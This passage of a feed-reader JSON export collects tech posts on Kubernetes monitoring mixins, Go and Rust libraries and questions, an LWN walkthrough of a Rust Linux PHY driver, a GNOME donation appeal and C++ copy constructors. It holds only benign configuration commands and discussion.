anonymous generated/alerts.yml \nmimirtool rules load http://localhost:8080 anonymous generated/rules.yml \n</code></pre></div></div><p>Here too, we have multiple options and no clear winner. If you are using the Grafana Operator, you can create  resources.</p><div><div><pre><code></code></pre></div></div><p>Another option would be to use the Grafana API and import the dashboards with  or .</p><div><div><pre><code>curl  POST http://localhost:3000/apis/dashboard.grafana.app/v1beta1/namespaces/default/dashboards  @mixins/generated/dashboards/apiserver.json\n</code></pre></div></div><p>What I ended up doing instead was using the Grafana sidecar to read dashboards from . We could put multiple dashboards in a single configmap but we need to stay under the 1MB size limit.</p><div><div><pre><code></code></pre></div></div><p>If you are using the Grafana Helm chart, you need to enable the sidecar. By default, it only imports from the same namespace.</p><div><div><pre><code></code></pre></div></div><p>If we head over to Grafana, we will find more dashboards, alerts and rules than we could ever dream of.</p><p>We can explore the dashboards and probably learn something new about our cluster(s).</p><p>We were busy trying to get the Kubernetes Monitoring working and we added infrastructure that needs monitoring too. And guess what? There are mixins for that!</p><p>The same principle applies: we don’t need to start from scratch. There are Mixins available for monitoring <a href=\"https://github.com/grafana/mimir/tree/main/operations\">Mimir</a>, <a href=\"https://github.com/grafana/alloy/tree/main/operations/alloy-mixin\">Alloy</a>, and <a href=\"https://github.com/grafana/grafana/tree/main/grafana-mixin\">Grafana</a> itself.</p><p>Grafana Alloy and Mimir work well together out of the box. But Mimir’s distributed architecture is overkill for most single-cluster setups.</p><p>Mixins are powerful, they can bring in an amount of knowledge and best practices that would take us a long time to gain on our own.\nBut things are still not fully mature, there is no clear strategy to implement GitOps for the generated files. This makes me assume that the usage is not that widespread yet.</p><p>The building blocks are there. Don’t wait for the explosions, start with observability from day one.</p>","contentLength":8865,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lmghsc/kubernetes_observability_from_day_one_mixins_on/"},{"title":"[R] Thought Anchors: Which LLM Reasoning Steps Matter?","url":"https://www.reddit.com/r/MachineLearning/comments/1lmg313/r_thought_anchors_which_llm_reasoning_steps_matter/","date":1751092368,"author":"/u/jsonathan","guid":174237,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/jsonathan\"> /u/jsonathan </a>","contentLength":32,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Currently learning Go and wondering how much of a real problem this post is?","url":"https://www.reddit.com/r/golang/comments/1lmfuc8/currently_learning_go_and_wondering_how_much_of_a/","date":1751091456,"author":"/u/ninjaclown123","guid":174238,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/ninjaclown123\"> /u/ninjaclown123 </a>","contentLength":36,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go library for rendering pixel images in the terminal","url":"https://www.reddit.com/r/golang/comments/1lmft2d/go_library_for_rendering_pixel_images_in_the/","date":1751091321,"author":"/u/Distinct_Peach5918","guid":174360,"unread":true,"content":"<p>go-pixels is a library for rendering pixel images directly in the terminal using Unicode block characters and ANSI color codes.</p><pre><code>output, err := gopixels.FromImagePath(imagePath, 50, 55, \"halfcell\", true) if err != nil { fmt.Fprintf(os.Stderr, \"error: %v\\n\", err) os.Exit(1) } </code></pre><p>One thing I like about go is the explicit and predictable control flow of handling errors, rather than exceptions or try/catch blocks like JS (I was a JS dev before learning Go).</p>","contentLength":452,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Claude wrote me this story of a dev learning kubernetes, too accurate","url":"https://www.reddit.com/r/kubernetes/comments/1lmexzh/claude_wrote_me_this_story_of_a_dev_learning/","date":1751088079,"author":"/u/yasserius","guid":174178,"unread":true,"content":"<p>Sam stared at the terminal screen, the familiar  command having just successfully deployed their e-commerce application to the production server. Three containers humming along nicely: the React frontend, Node.js API, and PostgreSQL database. Everything was working perfectly, until...</p><p>\"We need to handle Black Friday traffic,\" their CTO had said in yesterday's meeting. \"Last year we went down for two hours. This year, we need to be ready to scale horizontally.\"</p><p> Sam thought. <em>I can barely spell that word, let alone implement it.</em></p><p>Sam opened a new browser tab and typed: \"docker compose scaling production kubernetes\"</p><p> they muttered, scrolling through the search results. </p><p>The first article started innocuously enough: \"Kubernetes is a container orchestration platform...\"</p><p><em>Container orchestration. Okay, I orchestrate containers with docker-compose already. How hard can this be?</em></p><p>But then came the terminology avalanche:</p><ul></ul><p><em>What the hell is a DaemonSet?</em> Sam's inner voice was getting increasingly panicked. <em>And why do they need so many different types of... things?</em></p><p>Forty-five minutes later, Sam had seventeen browser tabs open and was no closer to understanding anything. The official Kubernetes documentation felt like reading a manual for a spaceship when all they wanted was to drive a car.</p><p><em>\"Kubernetes provides you with a framework to run distributed systems resiliently,\"</em> Sam read aloud. <em>Distributed systems? I just want my three containers to not fall over when people buy stuff.</em></p><p>They leaned back in their chair, rubbing their temples. <em>Maybe I should just get a bigger server. Add more RAM. That's scaling, right?</em></p><p>But deep down, Sam knew that wasn't the answer. The writing was on the wall – everyone was talking about Kubernetes. Every job posting mentioned it. Every conference talk assumed you knew it.</p><p>Sam opened a notepad and started drawing comparisons, trying to map their familiar Docker Compose world to this new Kubernetes universe:</p><pre><code>Docker Compose → Kubernetes ───────────────────── ────────── docker-compose.yml → ??? (Multiple YAML files?) services: → Services? Deployments? web: → Pod? Container? volumes: → PersistentVolumes? networks: → ??? (Built-in networking?) environment: → ConfigMaps? Secrets? </code></pre><p><em>This is like learning that cars aren't just \"cars\" but are actually composed of engines, transmissions, differentials, and a hundred other parts,</em> Sam thought. <em>I just want to drive the damn thing.</em></p><p>Sam typed: \"docker compose vs kubernetes beginner\"</p><p>The top answer started: <em>\"Well, actually, you can't really compare them directly because Docker Compose is for single-host deployments while Kubernetes is for multi-host orchestration...\"</em></p><p><em>Great. Just great. I'm asking the wrong questions.</em></p><p>Another answer: <em>\"If you're coming from Docker Compose, think of it this way: your docker-compose.yml becomes multiple Kubernetes manifests...\"</em></p><p><em>Multiple files? I love my single docker-compose.yml file. It's simple. It's clean. Why do I need multiple anything?</em></p><p>Sam pushed back from the desk and stared at the ceiling. <em>Do I really need this complexity?</em></p><p>They opened a mental decision matrix:</p><p><strong>Pros of staying with Docker Compose:</strong></p><ul><li><em>One file to rule them all</em></li></ul><p><strong>Cons of staying with Docker Compose:</strong></p><ul><li><em>Single point of failure (one server)</em></li><li><em>Manual scaling (SSH in, docker-compose up --scale)</em></li><li><em>Rolling updates? What are those?</em></li><li><em>Career growth? What career growth?</em></li></ul><ul></ul><ul><li><em>Learning curve looks like Mount Everest</em></li><li><em>Complexity that makes my brain hurt</em></li><li><em>Debugging distributed systems</em></li></ul><p>Sam found a helpful comparison chart online and started to see some patterns:</p><table><thead><tr></tr></thead><tbody><tr><td align=\"left\"><em>Why two things for one thing?</em></td></tr><tr><td align=\"left\"><code>containers: - image: nginx</code></td><td align=\"left\"><em>Okay, this looks familiar</em></td></tr><tr><td align=\"left\"><code>Servicetype: LoadBalancer</code> with</td><td align=\"left\"><em>More complex but I can see why</em></td></tr><tr><td align=\"left\"><em>Volumes are volumes, right? Right?</em></td></tr><tr><td align=\"left\"><em>Finally, something that makes sense</em></td></tr><tr><td align=\"left\"><em>Built into Service discovery</em></td></tr><tr><td align=\"left\"><em>Less configuration? I like this</em></td></tr></tbody></table><p> Sam thought, <em>maybe there's method to this madness.</em></p><p>After three hours of reading, Sam stumbled upon a blog post titled \"I migrated from Docker Compose to Kubernetes and lived to tell about it.\"</p><p>The author wrote: <em>\"The thing that finally clicked for me was realizing that Kubernetes isn't just 'Docker Compose but harder' – it's solving fundamentally different problems. Docker Compose says 'run these containers on this machine.' Kubernetes says 'ensure these applications are always running somewhere in this cluster of machines, and I don't care which specific machine.'\"</em></p><p> Sam thought. <em>It's not about containers. It's about resilience.</em></p><p>They imagined their current setup: <em>If my production server dies, everything dies. With Kubernetes, if one server dies, the containers just... move?</em></p><p>Sam closed all the browser tabs except one – a beginner's tutorial titled \"Your First Kubernetes App: Converting Docker Compose to K8s.\"</p><p> they said aloud to the empty office. <em>I'm doing this. But I'm starting small. Really small. Like, embarrassingly small.</em></p><p>They opened a new terminal window and typed:</p><pre><code># First, let me see what this kubectl thing is about which kubectl </code></pre><p><em>Of course it's not found. Nothing is ever that easy.</em></p><p>Sam's cursor blinked expectantly in the terminal. The journey from Docker Compose comfort zone to Kubernetes mastery was about to begin, one terrifying command at a time.</p><p> Sam thought, opening the kubectl installation documentation. <em>If I can figure out Docker Compose, I can figure out this Kubernetes thing. It's just... more complicated. Way more complicated.</em></p><p><em>But maybe that's the point.</em></p>","contentLength":5436,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Donate Less – The Everyone Environment","url":"https://blogs.gnome.org/steven/2025/06/26/donate-less/","date":1751081446,"author":"/u/gilvbp","guid":174157,"unread":true,"content":"<p>We have a <a href=\"https://donate.gnome.org\">new donation page</a>. But before you go there, I would like to impress upon you this idea:</p><p>We would vastly prefer you donate $10/mo for one year ($120 total) than $200 in one lump sum. That’s counter-intuitive, so let me explain.</p><p>First of all, cash flow matters just as much to a non-profit as it does to a corporation. If a business only saw revenue once or twice a year — say, in the form of $300,000 cheques — it would need to be very careful with expenses, for fear of one of those cheques disappearing.</p><p>And so it is with non-profits. A non-profit built on chasing grants and begging for large cheques is inherently fragile. Financial planning that is based on big, irregular revenue sources is bound to fail sooner or later. Conversely, financial planning based on monthly recurring revenue trends close to reality. The organization is more stable as a result.</p><p>Second, if your monthly donation is negligible, you probably won’t worry too much about whether you keep your donation going or not. Maybe you decide $10/mo is such a small number (the price of two coffees in any country where I’ve lived over the past 15 years) that you’re happy to keep on donating at the end of one year? Great! If not? No hard feelings. The consistency still made the $120 figure extremely valuable to us.</p><p>We want your donation to represent a number that is very comfortable for you. Personally, I make two larger (for me) donations every month. Out of my bank account in India, I donate $50/mo to a charity in Sikkim. Out of my Canadian bank account, I donate $100/mo to a charity in Nova Scotia. I have enough money available in both countries that these donations will not run out before I die. These are the two most important charities I donate to… but I’m not putting myself at risk by donating to them.</p><p>If you value GNOME, we would appreciate your support. But your comfort is essential. $50/mo is too much? Don’t stretch yourself! $25/mo or $15/mo still makes a massive difference. We’re asking all GNOME users, developers, and fans to consider supporting us in this way. (If you’re not sure if you run GNOME, it’s the default desktop on Ubuntu, Fedora, Debian, and Red Hat.)</p><p>GNOME brings incredible value to the world. This is how you ensure that it continues to exist.</p>","contentLength":2288,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lmd1f6/donate_less_the_everyone_environment/"},{"title":"What Rust-related podcasts do you listen to?","url":"https://www.reddit.com/r/rust/comments/1lm9q7m/what_rustrelated_podcasts_do_you_listen_to/","date":1751070824,"author":"/u/Hixon11","guid":174236,"unread":true,"content":"<p>It would be great to learn something new, or just catch up on recent news from the Rust ecosystem during my commute. </p><p>What are your favorite Rust-related podcasts? Preferably related to distributed systems and backends, rather than game dev.</p>","contentLength":240,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust for Beginners","url":"https://www.reddit.com/r/rust/comments/1lm949g/rust_for_beginners/","date":1751069027,"author":"/u/hsauro","guid":174652,"unread":true,"content":"<p>I have just released a beginner's book on Rust, called, unsurprisingly, 'Rust for Beginners'. The book originated from my interest in learning Rust, a language I had wanted to explore for some time. The book isn't intended for experts, but rather for beginners. It's intent is to break the ice on what is, a rather novel language, allowing a new developer to transition to more advanced texts. I am sure there are some typos and possibly even conceptual mistakes, but I will update it if and when I receive feedback. Unfortunately, I can't give any more information as the filters reject the post. </p>","contentLength":598,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux Ransomware","url":"https://youtu.be/fNWPODkEHSA","date":1751067254,"author":"/u/Garou-7","guid":174067,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lm8hv1/linux_ransomware/"},{"title":"Security Manager seeking 2min feedback: Do you also lose track of cluster security?","url":"https://www.reddit.com/r/kubernetes/comments/1lm8cgw/security_manager_seeking_2min_feedback_do_you/","date":1751066827,"author":"/u/redbitbit","guid":174040,"unread":true,"content":"<p>I'm an IT Security Manager and daily struggle with keeping track of our Kubernetes cluster security. Especially frustrating: monitoring vulnerable container images and RBAC permissions while different dev teams are deploying.</p><p>Currently developing a solution for this and would love to know if others face the same problem.</p><p>If you work in Security/DevSecOps/K8s Admin: Could you spare 2 minutes for quick feedback?</p><p>Would really appreciate your insights!</p>","contentLength":449,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"gozo v0.2 is out with composable streaming","url":"https://github.com/sonirico/gozo?tab=readme-ov-file#streams","date":1751066715,"author":"/u/sonirico","guid":174042,"unread":true,"content":"<p>Hey <a href=\"https://github.com/r/golang\">r/golang</a>! I've been working on , a Go utility library, and just released v0.2 with a major new feature: .</p><p>The streams package provides a clean, idiomatic way to build data processing pipelines in Go. Think of it as functional programming meets Go's simplicity.</p><p>Here's a practical HTTP handler that processes JSONEachRow (ndjson) data, filters and transforms it, then writes to both the HTTP response and a database:</p><pre><code>func handleUserData(w http.ResponseWriter, r *http.Request) { // Create a JSONEachRow reader from request body reader := streams.JSON[User](r.Body) // Filter active users only activeUsers := streams.Filter(reader, func(u User) bool { return u.IsActive }) // Transform to analytics format analytics := streams.Map(activeUsers, func(u User) UserAnalytics { return UserAnalytics{ ID: u.ID, Country: u.Country, JoinDate: u.CreatedAt, Tier: calculateTier(u), } }) dbWriter := NewMyDatabaseWriter[UserAnalytics](db, \"user_analytics\") // Process the entire pipeline, write to both HTTP response and database written, err := streams.Multicast(analytics, w, dbWriter) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } log.Printf(\"Processed %d records\", written) } </code></pre><p>The result is a library that feels like writing normal Go code, but with the power of composable data pipelines.</p><p>The library also includes utilities for slices, maps, and functional programming patterns. Would love to hear your thoughts!</p>","contentLength":1442,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lm8b1a/gozo_v02_is_out_with_composable_streaming/"},{"title":"Rust in the Linux kernel: part 2","url":"https://lwn.net/SubscriberLink/1025232/fbb2d90d084368e3/","date":1751066271,"author":"/u/ketralnis","guid":174357,"unread":true,"content":"<blockquote><table><tbody><tr><td><p>\nThe following subscription-only content has been made available to you \nby an LWN subscriber.  Thousands of subscribers depend on LWN for the \nbest news from the Linux and free software communities.  If you enjoy this \narticle, please consider <a href=\"https://lwn.net/subscribe/\">subscribing to LWN</a>.  Thank you\nfor visiting LWN.net!\n</p></td></tr></tbody></table></blockquote><p>\nIn 2023, Fujita Tomonori\n<a href=\"https://lwn.net/ml/all/20231012125349.2702474-5-fujita.tomonori@gmail.com/\">\nwrote a Rust version</a> of the existing driver for the\nAsix AX88796B embedded Ethernet controller. At slightly more than 100 lines,\nit's about as simple as a driver can be, and therefore is a useful touchstone for\nthe differences between writing Rust and C in the kernel. Looking at the Rust\nsyntax, types, and APIs used by the driver and contrasting them with the C\nversion will help illustrate those differences.\n</p><p>\nReaders who are already conversant with Rust may find this article retreads some\nbasics, but it is my hope that it can still serve as a useful reference for\nimplementing simple drivers in Rust. The\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b.c\">\nC version</a> and the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b_rust.rs\">\nRust version</a> of the AX88796B driver are remarkably similar, but there are still some important\ndifferences that could trip up a developer performing a naive rewrite from one to the other.\n</p><p>\nThe least-different thing between the two versions is the legalities. The Rust\ndriver starts with an\n<a href=\"https://docs.kernel.org/process/license-rules.html\">\nSPDX comment</a> asserting that the file is covered by the GPL,\nas many files in the kernel do. Below that is a documentation comment:\n</p><pre>    //! Rust Asix PHYs driver\n    //!\n    //! C version of this driver: [`drivers/net/phy/ax88796b.c`](./ax88796b.c)\n</pre><p>\nAs mentioned in the\n<a href=\"https://lwn.net/Articles/1024202/\">\nprevious article</a>, comments starting with  contain documentation that applies\nto the\nentire file. The next few lines are a  statement, the Rust analogue\nof :\n</p><pre>    use kernel::{\n        c_str,\n        net::phy::{self, reg::C22, DeviceId, Driver},\n        prelude::*,\n        uapi,\n    };\n</pre><p>\nLike C, Rust modules are located starting from a search path and then continuing\ndown a directory tree. Unlike C, a  statement can selectively import\nonly some items defined in a module. For example,  is not a separate module,\nbut rather a specific item inside the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/rust/kernel/net/phy.rs\"></a> module. By\nimporting both  and \nas a whole, the Rust module can refer to  directly, and\nanything else from the PHY module as . These items can always\nbe referred to by their full paths; a  statement just introduces a\nshorter local alias. If a name would be ambiguous, the compiler will complain.\n</p><p>\nAll of these imported items come from the  crate (Rust library),\nwhich contains the bindings between the main kernel and Rust code. In a\nuser-space Rust project, a program would usually also have some imports from\n, Rust's standard library, but that isn't possible in the kernel,\nsince the kernel needs more precise control over allocation and other details\nthat the standard library abstracts away. Kernel C developers can't use\nfunctions from libc in the kernel for much the same reason. The\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/rust/kernel/prelude.rs\"> module</a> contains kernel replacements for many common\nstandard-library functions; the remainder can be found in , the\nsubset of  that doesn't allocate.\n</p><p>\nIn the C version of the driver, the next step is to define some constants\nrepresenting the three different, but related, devices this driver supports: the\nAX88772A, the AX88772C, and the AX88796B. In Rust, items do not have to be\ndeclared before use — the entire file is considered at once. Therefore, Fujita\nchose to reorder things slightly to keep the code for each board in its own\nsection; the types for each board ( and so on) are defined\nlater.\nThe next part of the Rust driver is a macro invocation that sets up the\nnecessary symbols for a PHY driver:\n</p><pre>    kernel::module_phy_driver! {\n        drivers: [PhyAX88772A, PhyAX88772C, PhyAX88796B],\n        device_table: [\n            DeviceId::new_with_driver::&lt;PhyAX88772A&gt;(),\n            DeviceId::new_with_driver::&lt;PhyAX88772C&gt;(),\n            DeviceId::new_with_driver::&lt;PhyAX88796B&gt;()\n        ],\n        name: \"rust_asix_phy\",\n        authors: [\"FUJITA Tomonori &lt;fujita.tomonori@gmail.com&gt;\"],\n        description: \"Rust Asix PHYs driver\",\n        license: \"GPL\",\n    }\n</pre><p>\nRust macros come in two general kinds: attribute macros, which are written\n and modify the item that they appear before, and normal\nmacros, which are written . There is also a less common\nvariant of attribute macros written  which applies to the\ndefinition that they appear within. Normal macros can use any\nmatching set of braces to enclose their arguments, but can always be recognized\nby the mandatory exclamation mark between the name and the braces.\nThe convention is to use\nparentheses for macros that return a value and braces for macros that are\ninvoked to define a structure (as is the case here), but that is not actually\nrequired. Invoking the macro with parentheses would have the same result, but it\nwould make it less obvious to other Rust programmers what is happening.\n</p><p>\nThe  argument to the macro contains the names of the three board\ntypes this driver covers. Each driver has to be associated with information such\nas the name of the device and the PHY device ID that it should be active for. In\nthe C version of the driver, this is handled by a separate table:\n</p><pre>    static struct phy_driver asix_driver[] = { ... };\n</pre><p>\nIn the Rust code, this information is stored in the code for each board (see\nbelow), since\nall PHY drivers need to provide it. Overall, the\n macro serves the same role as the\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/phy.h#L2126\"></a> macro in C.\n</p><p>\nNext, the Rust driver defines two constants that the code uses later:\n</p><pre>    const BMCR_SPEED100: u16 = uapi::BMCR_SPEED100 as u16;\n    const BMCR_FULLDPLX: u16 = uapi::BMCR_FULLDPLX as u16;\n</pre><p>\nEvery declaration of a value (as opposed to a data structure) in Rust starts\nwith either  or . The former are compile-time\nconstants — like a simple  in C. Types are mandatory for\n definitions, but optional for  ones. In either case,\nthe type always appears separated from the name by a colon.\nSo, in this case, both constants are\n values, Rust's unsigned 16-bit integer type. The \npart at the end is a cast, since the original  constants\nbeing referenced are defined in C and assumed to be 32 or 64 bits by default,\ndepending on the platform.\n</p><p>\nThe final piece of code before the actual drivers is a shared function for\nperforming a soft reset on Asix PHYs:\n</p><pre>    // Performs a software PHY reset using the standard\n    // BMCR_RESET bit and poll for the reset bit to be cleared.\n    // Toggle BMCR_RESET bit off to accommodate broken AX8796B\n    // PHY implementation such as used on the Individual\n    // Computers' X-Surf 100 Zorro card.\n    fn asix_soft_reset(dev: &amp;mut phy::Device) -&gt; Result {\n        dev.write(C22::BMCR, 0)?;\n        dev.genphy_soft_reset()\n    }\n</pre><p>\nThere's a few things to notice about this function. First of all, the comment\nabove it is not a documentation comment. This isn't a problem because this\nfunction is also private — since it was declared with  instead of\n, it's not visible outside this one module. The C equivalent\nwould be a  function. In Rust, the default is the opposite way around,\nwith functions being private (static) unless declared otherwise.\n</p><p>\nThe argument to the function is an  called .\nReferences (written with an &amp;)\nare in many ways Rust's most prominent feature; they are like\npointers, but with compile-time guarantees that certain classes of bugs (such as\nconcurrent mutable access without synchronization) can't happen. In this case,\n takes a mutable reference (). The\ncompiler guarantees that no other function can have a reference to the\nsame\n<a href=\"https://rust.docs.kernel.org/kernel/net/phy/struct.Device.html\"></a> at the same time. This means that the body of the\nfunction can clear the  pin and trigger a soft reset without\nworrying about concurrent interference.\n</p><p>\nThe last part of the function to understand is the return type,\n<a href=\"https://rust.docs.kernel.org/kernel/error/type.Result.html\"></a>, and the \"try\" operator, . In C, a function that could fail often\nindicates this by returning a special sentinel value, typically a negative number.\nIn Rust, the same thing is true, but the sentinel value is called \ninstead, and is one possible value of the  enumeration. The other\nvalue is , which indicates success. Both  and \ncan carry additional information, but the default in the kernel is for  to carry an\n<a href=\"https://rust.docs.kernel.org/kernel/error/struct.Error.html\">\nerror number</a>, and for  to have no additional information.\n</p><p>\nThe pattern of checking for an error and then immediately propagating it to a\nfunction's caller is so common that Rust introduced the try operator as a\nshortcut. Consider the same function from the C version of the driver:\n</p><pre>    static int asix_soft_reset(struct phy_device *phydev)\n    {\n\t    int ret;\n\n\t    /* Asix PHY won't reset unless reset bit toggles */\n\t    ret = phy_write(phydev, MII_BMCR, 0);\n\t    if (ret &lt; 0)\n\t\t    return ret;\n\n\t    return genphy_soft_reset(phydev);\n    }\n</pre><p>\nIt performs the same two potentially fallible library function calls, but needs\nan extra statement to propagate the potential error. In the Rust version, if the\nfirst call returns an , the try operator automatically returns it.\nFor the second call, note how the line does not end with a semicolon — this\nmeans the value of the function call is also the return value of the function as\na whole, and therefore any errors will also be returned to the caller. The\nmissing semicolon is not easy to forget, however, because adding it in will make\nthe compiler complain that the function does not return a .\n</p><p>\nThe actual driver code differs slightly for the three different boards. The\nsimplest is the AX88786B, the implementation of which starts on\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/drivers/net/phy/ax88796b_rust.rs#L124\">\nline 124</a>:\n</p><p>\nThis is an empty structure. An actual instance of this type has no storage\nassociated with it — it doesn't take up space in other structures,\n<a href=\"https://doc.rust-lang.org/std/mem/fn.size_of.html\"></a> reports 0, and it has no padding — but there can still be\nglobal data for the type as a whole (such as debugging information). In this\ncase, an empty structure is used to implement the  abstraction,\nin order to bundle all of the needed data and functions for a PHY driver\ntogether. When the compiler is asked to produce functions that apply to a\n (which the  macro does), it\nwill use this definition:\n</p><pre>    #[vtable]\n    impl Driver for PhyAX88796B {\n        const NAME: &amp;'static CStr = c_str!(\"Asix Electronics AX88796B\");\n        const PHY_DEVICE_ID: DeviceId =\n            DeviceId::new_with_model_mask(0x003b1841);\n\n        fn soft_reset(dev: &amp;mut phy::Device) -&gt; Result {\n            asix_soft_reset(dev)\n        }\n    }\n</pre><p>\nThe constant and function definitions work in the same way as above. The type of\n uses a static reference (\"\"), which is\na reference\nthat is valid for the entire lifetime of the program. The C equivalent is a\n pointer to the data section of the executable: it is never\nallocated, freed, or modified, and is therefore fine to dereference anywhere in\nthe program.\n</p><p>\nThe new\nRust feature in this part of the driver is the  block, which is used to implement a\n<a href=\"https://doc.rust-lang.org/book/ch10-02-traits.html#traits-defining-shared-behavior\">\ntrait</a>. Often, a program will have multiple different parts that conform to\nthe same interface. For example, all PHY drivers need to provide a name,\nassociated device ID, and some functions implementing driver operations.\nIn Rust, this kind of common interface is represented by a\ntrait, which lets the compiler perform static type dispatch to select the right\nimplementation based on how the trait functions are called.\n</p><p>\nC, of course, does not work like this (although\n<a href=\"https://en.cppreference.com/w/c/language/generic.html\"></a> can sometimes\nbe used to implement type dispatch manually). In the kernel's C code, PHY drivers are\nrepresented by\n<a href=\"https://elixir.bootlin.com/linux/v6.15.2/source/include/linux/phy.h#L876\">\na structure</a> that contains data and function pointers. The\n macro converts a Rust trait into a singular C structure full of\nfunction pointers. Up above, in the call to , the\nreference to the  type lets the compiler find the right\n implementation, and from there produce the correct C structure\nto integrate with the C PHY driver infrastructure.\n</p><p>\nThere are obviously more functions involved in implementing a complete PHY\ndriver. Luckily, these functions are often the same between different devices,\nbecause there is a standard interface for PHY devices. The C PHY driver code\nwill fall back to a generic implementation if a more specific function isn't\npresent in the driver's definition, so the AX88796B code can leave them out.\nThe other two devices supported in this driver\nspecify more custom functions to work around hardware quirks, but those\nfunctions are not much more complicated than what has already been shown.\n</p><p>\nSteps to implement a PHY driver ...\n</p><table><tbody><tr><td valign=\"top\">Write module boilerplate (licensing and authorship information,\n statements, etc.).</td><td valign=\"top\">Write module boilerplate (licensing and authorship information, \nstatements, a call to ).</td></tr><tr><td valign=\"top\">Implement the needed functions for the driver, skipping functions that can\nuse the generic PHY code.\n</td><td valign=\"top\">Implement the needed functions for the driver, skipping functions that can\nuse the generic PHY code.\n</td></tr><tr><td valign=\"top\">Bundle the functions along with a name, optional flags, and PHY device ID\ninto a  and register it with the PHY subsystem.\n</td><td valign=\"top\">Bundle the functions along with a name, optional flags, and PHY device ID\ninto a trait; the  macro converts it into the right form for\nthe PHY subsystem.\n</td></tr></tbody></table><p>\nOf course, many drivers have specific hardware concerns or other complications;\nkernel software is distinguished by its complexity and concern with low-level\ndetails. The next article in this series will look at the design of the interface\nbetween the C and Rust code in the kernel, as well as the process of adding new\nbindings when necessary.\n</p>","contentLength":13254,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lm85b9/rust_in_the_linux_kernel_part_2/"},{"title":"Started looking into Rancher and really dont see a need for additional layer for managing the k8s clusters. Thoughts?","url":"https://www.reddit.com/r/kubernetes/comments/1lm6ein/started_looking_into_rancher_and_really_dont_see/","date":1751061657,"author":"/u/Nice-Pea-3515","guid":174011,"unread":true,"content":"<p>I am sure this was discussed in few posts in the past, but there are many ways of managing the k8s clusters (EKS or AKS, regardless of the provider). Really dont see the need of additional layer for Rancher to manage the K8s clusters.</p><p>I want to see if there are additional ways of benefits that Rancher will provide 🫡</p>","contentLength":319,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What Happens to the Original Variable When You Shadow It?","url":"https://www.reddit.com/r/rust/comments/1lm6c4a/what_happens_to_the_original_variable_when_you/","date":1751061494,"author":"/u/MrGuilt","guid":174179,"unread":true,"content":"<p>I'm trying to get my head around shadowing. The Rust book offers an example like:</p><p><code> let spaces=\" \"; let spaces=spaces.len(); </code></p><p>The original is a string type; the second, a number. That makes a measure of sense. I would assume that Rust would, through context, use the string or number version as appropriate. </p><p>But what if they are the same type?</p><p>Both are numbers.  would return . But is the first instance simply inaccessible? For all intents and purposes, this makes  mutable but taking more memory. Or is there some way I can say \"the original ?\"</p><p>(For that matter, in my first example, how could I specify I want the string version of  when the context is not clear?)</p>","contentLength":662,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I made a CPU stability testing tool - Threadstepper","url":"https://www.reddit.com/r/linux/comments/1lm5ylt/i_made_a_cpu_stability_testing_tool_threadstepper/","date":1751060523,"author":"/u/gazpitchy","guid":173980,"unread":true,"content":"<p>I enjoy overclocking, and moved onto using Linux for my desktop about a year ago.</p><p>I made this tool, Threadstepper, to basically test each core/thread under different/variable loads. This is particularly helpful for testing Ryzen CO and undervolting.</p><p>It has been helpful in my own testing, as OCCT core cycling doesn't actually seem to work at all on Linux (doesn't isolate load to individual cores). Corecycler, which I used on windows, doesn't appear to exist on Linux.</p><p>It is just a personal project I thought might help others, so feel free to do what you like with it! </p><p>Hopefully it helps others.</p>","contentLength":595,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Manpage cards","url":"https://www.reddit.com/r/linux/comments/1lm4ls1/manpage_cards/","date":1751057038,"author":"/u/No_Insurance_6436","guid":173981,"unread":true,"content":"<p>I want to use this old Rolodex for GNU/Linux commands. Has someone created flashcards for something like this, or will I need to make them myself? </p><p>I saw a website where someone was supposedly selling them for $30 but it's since been shutdown.</p>","contentLength":242,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Deep in Copy Constructor: The Heart of C++ Value Semantics","url":"https://www.gizvault.com/archives/deep-in-copy-constructor","date":1751056717,"author":"/u/nalaginrut","guid":174180,"unread":true,"content":"<p>The C++ copy constructor is not just a language feature. It's the beating heart of value semantics, ownership logic, and the infamous Rule of 3/5/0. Understanding it in depth means understanding how C++ treats identity, lifetime, and low-level control.</p><p>This post walks from basics to internals, guiding you through practical examples, compiler strategy, and design combinations under the Rule of 3 or 5, or 0, if you've ever heard.</p><p>In C++, the copy constructor is a special constructor used to initialize a new object as a copy of an existing object. It has this canonical form:</p><pre spellcheck=\"false\">MyClass( MyClass&amp; other);\n</pre><p>It’s called when an object is:</p><ul><li>Initialized from another (e.g. )</li><li>Stored in a container like  (unless moved)</li></ul><p>Unlike assignment, which replaces the value of an existing object, the copy constructor is about creating a new object.</p><h2>Why do we need copy constructors?</h2><p>Because C++ gives us value semantics, not just reference semantics like Java or Python.</p><p>In value semantics: each object is independent. A copy means a new instance with the same value, not the same reference.</p><p>This is powerful, but comes 